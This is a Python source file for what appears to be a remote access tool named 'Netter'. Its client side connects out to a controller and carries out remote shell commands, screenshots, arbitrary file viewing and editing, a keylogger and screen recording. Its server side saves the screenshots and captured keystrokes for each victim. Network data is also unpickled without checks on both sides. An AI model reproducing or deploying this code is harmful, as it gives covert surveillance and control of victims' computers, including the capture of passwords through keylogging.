import threading, socket, typing
import time, pickle, os, json, copy
from loguru import logger

import zlib

if typing.TYPE_CHECKING:
    from .device import ClientDevice
    from .bucket import ConnectionBucket
    from .sock import NetterServer

from .modules import screenshot as modules_screenshot
from .modules import file_editor
from .modules import keylogger
from .modules import command_exec
from .modules import screen_spy

class ClientWrapper:
    def __init__(self, connection: socket.socket, connectionAddress: tuple[str, int]) -> None:
        self.connection: socket.socket = connection

        self.connectionAddress: tuple[str, int] = connectionAddress

    def send_packet(self, data: str | bytes) -> int:
        if (isinstance(data, str)):
            data = data.encode('UTF-8')

        packetSize: bytes = len(data).to_bytes(4, 'big')
        self.connection.send(packetSize)

        byte_sended: int = 0

        while byte_sended < len(data):
            sent = self.connection.send(data[byte_sended:byte_sended + (5120)])

            if (sent == 0):
                raise RuntimeError('Socket connection broken')

            byte_sended += sent

        return int.from_bytes(packetSize, 'big')

    def receive_packet(self) -> bytes:
        packetSize: int = int.from_bytes(self.connection.recv(4), 'big')

        data, total_received = bytearray(), 0

        while total_received < packetSize:
            chunk = self.connection.recv(min(5120, packetSize - total_received))

            if not chunk:
                raise RuntimeError('Socket connection broken')

            data.extend(chunk)
            total_received += len(chunk)

        return bytes(data)

    def connect(self) -> None:
        return self.connection.connect(self.connectionAddress)

class ServerHandler:
    """
    Client

    This is where the client should do whatever the server sents
    """

    def __init__(self, server_address: tuple[str, int], deviceData: bytes, additionalData: dict) -> None:
        self.isConnected, self.isRecording, self.isRunningKeylogger = (False, False, False)
        self.server_address: tuple = server_address

        self.socketInstance: ClientWrapper = ClientWrapper(
            socket.socket(socket.AF_INET, socket.SOCK_STREAM),
            server_address
        )

        self.socketInstance.connect()
        self.socketInstance.send_packet(deviceData)

        serverResponse: bytes = self.socketInstance.receive_packet()

        if (serverResponse == b'0'):
            self.socketInstance.send_packet(b'submit_additional_data ' + pickle.dumps(additionalData))
            self.isConnected = True
            return

    def start(self) -> None:
        logger.info('Connection established to %s:%s' % self.server_address)

        while self.isConnected:
            message: bytes = self.socketInstance.receive_packet()

            if (not message):
                logger.info('Connection to the server has disconnected, attempting to reconnect..')
                self.isConnected = False

            if (message.startswith(b'execute_command ')):
                command_exec.run(self, message)

            if (message.startswith(b'request_screenshot')):
                modules_screenshot.run(self.socketInstance)

            if (message.startswith(b'view_file ')):
                if (os.path.exists(filePath := message.decode()[10:])):
                    file = open(filePath, 'r+')
                    self.socketInstance.send_packet('0')
                    file_editor.run(self, filename = filePath, textIO = file)

                else:
                    self.socketInstance.send_packet('1')

            if (message.startswith(b'keylogger_activate')):
                if not (self.isRunningKeylogger):
                    threading.Thread(target = keylogger.run, args = (self,)).start()
                    self.isRunningKeylogger = True
                    self.socketInstance.send_packet('_keylogger_response 0')

                else:
                    self.isRunningKeylogger = False
                    self.socketInstance.send_packet('_keylogger_response 1')

            if (message.startswith(b'start_recording')):
                if not (self.isRecording):
                    threading.Thread(target = screen_spy.run, args = (self,)).start()
                    continue

                self.isRecording = False

class ClientHandler(threading.Thread):
    def __init__(self, connection: 'ClientDevice',
            connectionAddress: tuple[str, int],
            connectionBucket: 'ConnectionBucket',
            NetterInstance: 'NetterServer') -> None:

        threading.Thread.__init__(self)

        self.conneciton: 'ClientDevice' = connection
        self.connecitonAddress: tuple[str, int] = connectionAddress
        self.NetterInstance: 'NetterServer' = NetterInstance

        self.connectionBucket = connectionBucket
        self.isConnected: bool = True

    def disconnect_client(self) -> None:
        logger.info(f'{self.conneciton.publib_address} ({self.conneciton.hostname}) just leave the server')
        self.connectionBucket.connectionList.remove(self.conneciton)
        self.isConnected = False

    def run(self) -> None:
        if (self.conneciton.runningKeylogger):
            self.conneciton.socket.send_packet('keylogger_activate')

        while self.isConnected:
            if (self.conneciton.stillRecording): continue

            try:
                data: bytes = self.conneciton.socket.receive_packet()

            except ConnectionResetError:
                self.disconnect_client()

            if not (data):
                self.disconnect_client()

            if (data.startswith(b'submit_additional_data ')):
                clientAdditionalData: dict = pickle.loads(data[23:])
                self.conneciton.additionalData = clientAdditionalData

                if (self.conneciton.runningKeylogger):
                    self.conneciton.socket.receive_packet() # Used to verbose the _keylogger response

            elif (data.startswith(b'exec_response ')):

                if (data[14:15] == b'0'):
                    logger.success('Command execution successful with exit code: 0')

                elif (data[14:15] == b'1'):
                    logger.error('Command execution failed with exit code: 1')

                else:
                    logger.error('Command execution has reached the timeout (8s), execution terminated.')
                    self.NetterInstance._waitingForResponse = False
                    continue

                print(data[16:].decode())
                self.NetterInstance._waitingForResponse = False

            elif (data.startswith(b'screenshot_response ')):
                if (b'not_available' in data):
                    logger.error('Client device are not capable of taking screenshots.')
                    self.NetterInstance._waitingForResponse = False
                    continue

                fileName: str = f'clients/responses/{self.conneciton.clientUniqueID}/screenshot/{self.conneciton.hostname}-{str(time.time())}.png'
                screenImg: bytes = zlib.decompress(data[20:])

                self.conneciton.write_file(fileName, screenImg)
                logger.success(f'Screenshot has been save to {fileName}')
                self.NetterInstance._waitingForResponse = False

            elif (data.startswith(b'keylogger_response ')):
                self.conneciton.write_file(
                    f'clients/responses/{self.conneciton.clientUniqueID}/keylogger.log',
                    data[19:].decode('UTF-8') + '\n',
                    mode = 'a'
                )

            else:
                self.conneciton.catchingResponse = data
